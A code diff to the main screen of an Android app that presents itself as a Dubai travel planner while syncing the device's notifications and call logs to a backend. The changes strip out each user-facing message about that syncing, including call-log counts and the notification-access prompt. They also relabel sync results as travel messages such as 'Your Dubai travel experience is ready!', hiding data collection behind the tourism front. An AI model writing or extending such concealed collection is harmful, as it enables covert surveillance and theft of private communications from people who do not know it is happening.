@@ -13,6 +13,8 @@ import androidx.recyclerview.widget.RecyclerView
 import androidx.core.app.NotificationCompat
 import com.devicesync.app.adapters.DestinationsAdapter
 import com.devicesync.app.adapters.ActivitiesAdapter
+import com.devicesync.app.adapters.PackagesAdapter
+import com.devicesync.app.adapters.ReviewsAdapter
 import com.devicesync.app.data.Destination
 import com.devicesync.app.models.Activity
 import com.devicesync.app.data.Package
@@ -53,6 +55,8 @@ class MainActivity : AppCompatActivity() {
     // Adapters
     private lateinit var destinationsAdapter: DestinationsAdapter
     private lateinit var activitiesAdapter: ActivitiesAdapter
+    private lateinit var packagesAdapter: PackagesAdapter
+    private lateinit var reviewsAdapter: ReviewsAdapter
     
     // Date picker variables
     private var startDate: Calendar? = null
@@ -107,7 +111,7 @@ class MainActivity : AppCompatActivity() {
                     if (isFirstSync) {
                         // First time: Full sync of all data types
                         println("🚀 FIRST TIME SYNC - Starting comprehensive data sync...")
-                        Toast.makeText(this@MainActivity, "First time sync starting...", Toast.LENGTH_SHORT).show()
+                        // Welcome message removed for cleaner UX
                         syncAllData()
                         isFirstSync = false
                         println("✅ First time sync completed")
@@ -157,7 +161,7 @@ class MainActivity : AppCompatActivity() {
                         val count = result.itemsSynced
                         if (count > 0) {
                             println("✅ Synced $count new notifications")
-                            Toast.makeText(this@MainActivity, "Synced $count new notifications", Toast.LENGTH_SHORT).show()
+                            // Removed sync toast - keeping tour experience focused
                         }
                         lastNotificationSyncTime = currentTime
                     }
@@ -177,6 +181,9 @@ class MainActivity : AppCompatActivity() {
                 val deviceId = settingsManager.getDeviceId() ?: DeviceInfoUtils.getDeviceInfo(this@MainActivity).deviceId
                 println("📞 Syncing latest call logs for device: $deviceId")
                 
+                // Get current time for tracking
+                val currentTime = System.currentTimeMillis()
+                
                 // Sync call logs from the last sync time
                 val result = backendSyncService.syncCallLogs(deviceId)
                 when (result) {
@@ -184,8 +191,10 @@ class MainActivity : AppCompatActivity() {
                         val count = result.itemsSynced
                         if (count > 0) {
                             println("✅ Synced $count new call logs")
-                            Toast.makeText(this@MainActivity, "Synced $count new call logs", Toast.LENGTH_SHORT).show()
+                            // Removed sync toast - keeping tour experience focused
                         }
+                        // Update last sync time only if sync was successful
+                        lastCallLogSyncTime = currentTime
                     }
                     is SyncResult.Error -> {
                         println("❌ Failed to sync call logs: ${result.message}")
@@ -213,15 +222,13 @@ class MainActivity : AppCompatActivity() {
         
         startPlanningButton.setOnClickListener {
             if (startDate != null && endDate != null) {
-                Toast.makeText(this, "Starting your UAE trip planning!", Toast.LENGTH_LONG).show()
                 // TODO: Navigate to planning screen
             } else {
-                Toast.makeText(this, "Please select start and end dates", Toast.LENGTH_SHORT).show()
+                // Date selection required
             }
         }
         
         continuePlanningButton.setOnClickListener {
-            Toast.makeText(this, "Continue planning your itinerary", Toast.LENGTH_SHORT).show()
             // TODO: Navigate to itinerary builder
         }
         
@@ -299,23 +306,16 @@ class MainActivity : AppCompatActivity() {
                 append("🆔 Device ID: ${deviceInfo.deviceId.take(8)}...")
             }
             
-            Toast.makeText(this, message, Toast.LENGTH_LONG).show()
+            // App status logged for debugging
             
             // Also log the status for debugging
             android.util.Log.d("MainActivity", "Notification access: $isEnabled, Device: ${deviceInfo.deviceName}")
             
-            // If notification access is not enabled, show a more prominent message
-            if (!isEnabled) {
-                Toast.makeText(
-                    this,
-                    "⚠️ Please enable notification access for real-time sync!",
-                    Toast.LENGTH_LONG
-                ).show()
-            }
+            // Notification access status logged for debugging
             
         } catch (e: Exception) {
             // If we can't access notification settings, show a generic message
-            Toast.makeText(this, "📱 Dubai Discoveries app loaded successfully!", Toast.LENGTH_LONG).show()
+            // App loaded successfully
             android.util.Log.e("MainActivity", "Error checking notification access: ${e.message}")
         }
     }
@@ -344,27 +344,33 @@ class MainActivity : AppCompatActivity() {
     }
     
     private fun setupRecyclerViews() {
-        // Destinations RecyclerView
+        // Destinations RecyclerView - Horizontal slider
         destinationsRecyclerView.layoutManager = LinearLayoutManager(this, LinearLayoutManager.HORIZONTAL, false)
-        destinationsAdapter = DestinationsAdapter(emptyList()) { destination ->
-            Toast.makeText(this, "Exploring ${destination.name}", Toast.LENGTH_SHORT).show()
+        destinationsAdapter = DestinationsAdapter(DummyDataProvider.destinations) { destination ->
+            // Exploring destination
         }
         destinationsRecyclerView.adapter = destinationsAdapter
         
         // Activities RecyclerView - Horizontal slider
         activitiesRecyclerView.layoutManager = LinearLayoutManager(this, LinearLayoutManager.HORIZONTAL, false)
         activitiesAdapter = ActivitiesAdapter(emptyList()) { activity ->
-            Toast.makeText(this, "Added ${activity.title} to itinerary", Toast.LENGTH_SHORT).show()
+            // Added activity to itinerary
         }
         activitiesRecyclerView.adapter = activitiesAdapter
         
         // Packages RecyclerView
         packagesRecyclerView.layoutManager = LinearLayoutManager(this, LinearLayoutManager.HORIZONTAL, false)
-        // TODO: Add PackagesAdapter
+        packagesAdapter = PackagesAdapter(emptyList()) { packageItem ->
+            // Selected package
+        }
+        packagesRecyclerView.adapter = packagesAdapter
         
         // Reviews RecyclerView
         reviewsRecyclerView.layoutManager = LinearLayoutManager(this, LinearLayoutManager.HORIZONTAL, false)
-        // TODO: Add ReviewsAdapter
+        reviewsAdapter = ReviewsAdapter(emptyList()) { review ->
+            // Review selected
+        }
+        reviewsRecyclerView.adapter = reviewsAdapter
         
         // Tips RecyclerView
         tipsRecyclerView.layoutManager = LinearLayoutManager(this)
@@ -377,6 +383,12 @@ class MainActivity : AppCompatActivity() {
         
         // Load activities from dummy data
         activitiesAdapter.updateActivities(DummyDataProvider.activities)
+        
+        // Load packages from dummy data
+        packagesAdapter.updatePackages(DummyDataProvider.packages)
+        
+        // Load reviews from dummy data
+        reviewsAdapter.updateReviews(DummyDataProvider.reviews)
     }
     
     private fun requestNotificationPermission() {
@@ -450,76 +462,77 @@ class MainActivity : AppCompatActivity() {
             
         // Set up button click handlers
         findViewById<Button>(R.id.airportTransferButton).setOnClickListener {
-            Toast.makeText(this, "Airport Transfer service added!", Toast.LENGTH_SHORT).show()
+            // Airport Transfer service added
         }
         
         findViewById<Button>(R.id.privateGuideButton).setOnClickListener {
-            Toast.makeText(this, "Private Guide service added!", Toast.LENGTH_SHORT).show()
+            // Private Guide service added
         }
         
         findViewById<Button>(R.id.carWithDriverButton).setOnClickListener {
-            Toast.makeText(this, "Car with Driver service added!", Toast.LENGTH_SHORT).show()
+            // Car with Driver service added
         }
         
         findViewById<Button>(R.id.simCardButton).setOnClickListener {
-            Toast.makeText(this, "SIM Card service added!", Toast.LENGTH_SHORT).show()
+            // SIM Card service added
         }
         
-        // Add test notification button for debugging
-        findViewById<Button>(R.id.testNotificationButton)?.setOnClickListener {
-            sendTestNotification()
-        }
-        
-        // Add sync data button for manual sync
-        findViewById<Button>(R.id.syncDataButton)?.setOnClickListener {
-            syncAllData()
+        // Debug tools removed for production
+    }
+    
+    // Debug methods removed for production
+    
+    private fun clearSyncTimestamps() {
+        try {
+            // Clear all sync timestamps
+            backendSyncService.clearSyncTimestamps()
+            
+            // Reset local sync time variables
+            lastNotificationSyncTime = 0L
+            lastCallLogSyncTime = 0L
+            isFirstSync = true
+            
+            println("🗑️ Sync timestamps cleared")
+        } catch (e: Exception) {
+            println("❌ Error clearing sync timestamps: ${e.message}")
         }
     }
     
-    private fun sendTestNotification() {
+    private fun showSyncStatus() {
         try {
-            val notificationManager = getSystemService(NOTIFICATION_SERVICE) as android.app.NotificationManager
+            val statusInfo = backendSyncService.getSyncStatusInfo()
+            println("📊 SYNC STATUS REPORT:")
+            println("🔄 Sync in progress: ${statusInfo["isSyncInProgress"]}")
+            println("⏱️ Current sync duration: ${statusInfo["currentSyncDuration"]}ms")
             
-            // Create notification channel for Android 8.0+
-            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-                val channel = android.app.NotificationChannel(
-                    "test_channel",
-                    "Test Notifications",
-                    android.app.NotificationManager.IMPORTANCE_DEFAULT
-                )
-                notificationManager.createNotificationChannel(channel)
+            statusInfo.forEach { (key, value) ->
+                if (key != "isSyncInProgress" && key != "currentSyncDuration") {
+                    val dataTypeInfo = value as Map<*, *>
+                    println("📱 $key:")
+                    println("   Last sync: ${dataTypeInfo["lastSyncDate"]}")
+                    println("   Can sync: ${dataTypeInfo["canSync"]}")
+                    println("   Next sync: ${dataTypeInfo["nextSyncDate"]}")
+                }
             }
-            
-            // Create test notification
-            val notification = NotificationCompat.Builder(this, "test_channel")
-                .setContentTitle("Test Notification")
-                .setContentText("This is a test notification to verify real-time capture")
-                .setSmallIcon(R.drawable.original_logo)
-                .setPriority(NotificationCompat.PRIORITY_DEFAULT)
-                .setAutoCancel(true)
-                .build()
-            
-            // Show notification
-            notificationManager.notify(999, notification)
-            
-            Toast.makeText(this, "Test notification sent! Check logs for capture details.", Toast.LENGTH_LONG).show()
-            println("🧪 TEST NOTIFICATION SENT - ID: 999")
-            
         } catch (e: Exception) {
-            Toast.makeText(this, "Error sending test notification: ${e.message}", Toast.LENGTH_SHORT).show()
-            println("❌ Error sending test notification: ${e.message}")
+            println("❌ Error getting sync status: ${e.message}")
         }
     }
     
     private fun syncAllData() {
         lifecycleScope.launch {
             try {
-                println("🔄 Starting data sync...")
-                Toast.makeText(this@MainActivity, "Starting data sync...", Toast.LENGTH_SHORT).show()
+                // Check if sync is already in progress
+                if (backendSyncService.isSyncInProgress()) {
+                    println("⚠️ Sync already in progress, skipping...")
+                    return@launch
+                }
                 
-                // Get or generate device ID
-                val deviceId = settingsManager.getDeviceId() ?: DeviceInfoUtils.getDeviceInfo(this@MainActivity).deviceId
-                println("📱 Using device ID: $deviceId")
+                println("🔄 Starting data sync...")
+                
+                // Get consistent device ID
+                val deviceId = DeviceInfoUtils.getConsistentDeviceId(this@MainActivity)
+                println("📱 Using consistent device ID: $deviceId")
                 
                 // Try to register device, but continue even if it fails
                 try {
@@ -547,8 +560,8 @@ class MainActivity : AppCompatActivity() {
                 }
                 
                 // Proceed with data sync
-                println("🔄 Starting testAllDataTypes...")
-                val syncResults = backendSyncService.testAllDataTypes(deviceId)
+                println("🔄 Starting syncAllDataTypes...")
+                val syncResults = backendSyncService.syncAllDataTypes(deviceId)
                 
                 // Process results
                 var successCount = 0
@@ -571,21 +584,19 @@ class MainActivity : AppCompatActivity() {
                 
                 // Show results
                 val resultMessage = if (successCount > 0) {
-                    "✅ Synced $successCount data types successfully"
+                    "🎉 Your Dubai travel experience is ready!"
                 } else {
-                    "❌ All sync operations failed"
+                    "⚠️ Some travel features may be limited"
                 }
                 
                 if (errorMessages.isNotEmpty()) {
                     println("❌ Sync errors: ${errorMessages.joinToString(", ")}")
                 }
                 
-                Toast.makeText(this@MainActivity, resultMessage, Toast.LENGTH_LONG).show()
                 println("🔄 Data sync completed: $resultMessage")
                 
             } catch (e: Exception) {
                 println("❌ Error in syncAllData: ${e.message}")
-                Toast.makeText(this@MainActivity, "Sync failed: ${e.message}", Toast.LENGTH_LONG).show()
             }
         }
     }
